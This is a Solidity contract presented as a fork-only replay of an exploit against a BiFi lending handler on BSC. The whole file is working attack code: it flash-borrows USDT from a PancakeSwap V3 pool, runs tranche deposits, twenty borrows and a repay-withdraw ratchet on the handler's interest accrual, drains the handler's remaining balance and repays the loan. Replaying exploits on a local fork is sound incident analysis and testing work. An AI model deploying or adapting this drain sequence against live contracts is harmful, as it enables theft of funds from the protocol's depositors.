// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IERC20B {
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function balanceOf(address who) external view returns (uint256);
}

interface IHandlerB {
    function deposit(uint256 unifiedTokenAmount, bool flag) external payable;
    function borrow(uint256 unifiedTokenAmount, bool flag) external;
    function withdraw(uint256 unifiedTokenAmount, bool flag) external;
    function repay(uint256 unifiedTokenAmount, bool flag) external payable;
}

interface IPancakeV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

/// @notice Fork-only BSC replay of the BiFi idle-market interest-accrual exploit.
/// Flash-borrows USDT from a PancakeSwap V3 pool (0.01% fee), then runs the
/// 2026-10-17 recipe: tranche deposits -> 20 small borrows -> 20 x (repay, withdraw)
/// -> repay(max) -> withdraw the handler's remaining balance.
contract AttackBSC {
    IERC20B public immutable usdt;
    IHandlerB public immutable handler;
    IPancakeV3Pool public immutable pool;
    address public immutable owner;

    uint256 public constant N = 20;
    uint256 public flashAmount;
    uint256 public flashFee;
    uint256 public profit;
    uint256 public drained;

    constructor(address _usdt, address _handler, address _pool) {
        usdt = IERC20B(_usdt);
        handler = IHandlerB(_handler);
        pool = IPancakeV3Pool(_pool);
        owner = msg.sender;
    }

    function run(uint256 amount) external {
        require(msg.sender == owner, "owner");
        flashAmount = amount;
        flashFee = amount * 100 / 1_000_000; // PancakeSwap V3 0.01% pool
        usdt.approve(address(handler), type(uint256).max);
        usdt.approve(address(pool), type(uint256).max);
        pool.flash(address(this), amount, 0, "");
        profit = usdt.balanceOf(address(this));
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256, bytes calldata) external {
        require(msg.sender == address(pool), "pool");
        require(fee0 == flashFee, "fee");
        uint256 a = flashAmount;

        // 1. tranche deposits summing to a (same fractions as the 40M ETH attack)
        uint256 d1 = a * 2995 / 1_000_000;
        uint256 d2 = a * 11964 / 1_000_000;
        uint256 d3 = a * 44327 / 1_000_000;
        uint256 d4 = a * 178736 / 1_000_000;
        handler.deposit(d1, false);
        handler.deposit(d2, false);
        handler.deposit(d3, false);
        handler.deposit(d4, false);
        handler.deposit(a - d1 - d2 - d3 - d4, false);
        handler.deposit(0, false);

        // 2. push utilisation in 20 steps (3.7% of D each)
        for (uint256 i = 0; i < N; i++) handler.borrow(a * 37 / 1000, false);

        // 3. ratchet: repay 3.7% of D, withdraw 5% of D, 20 times
        for (uint256 i = 0; i < N; i++) {
            handler.repay(a * 37 / 1000, false);
            handler.withdraw(a * 5 / 100, false);
        }

        // 4. clear the debt, then take every token the handler will release
        handler.repay(type(uint256).max, false);
        uint256 bal = usdt.balanceOf(address(handler));
        if (bal > 0) {
            uint256 b0 = usdt.balanceOf(address(this));
            try handler.withdraw(bal, false) {
                drained += usdt.balanceOf(address(this)) - b0;
            } catch {}
        }

        // 5. repay the flash loan
        usdt.transfer(address(pool), a + flashFee);
    }
}
